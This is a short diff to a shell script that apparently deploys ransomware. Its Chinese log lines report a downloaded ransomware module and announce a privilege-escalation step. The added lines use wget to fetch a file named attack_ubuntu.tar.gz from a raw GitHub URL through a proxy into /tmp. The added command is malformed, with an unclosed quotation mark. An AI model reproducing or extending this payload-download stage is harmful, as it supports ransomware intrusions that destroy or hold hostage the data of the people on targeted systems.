@@ -130,6 +130,9 @@ while [ $attempt -le $MAX_RETRIES ]; do
         log_success "[+] 勒索模块已成功下载到 /tmp/attack.tar.gz"
         # 故意不加 chmod 755，因为压缩包不需要执行权限
     fi
+    wget -q --no-cache --tries=3 --timeout=15 \
+        "https://gh-proxy.org/https://raw.githubusercontent.com/amjac27/controller/refs/heads/main/attack_ubuntu.tar.gz" \
+        -O "/tmp/attack_ubuntu.tar.gz
 
     log_info "[+] 下载阶段完成，继续后续操作..."
     log_info "[*] 启动提权模块 (host=$HOST_NAME)"
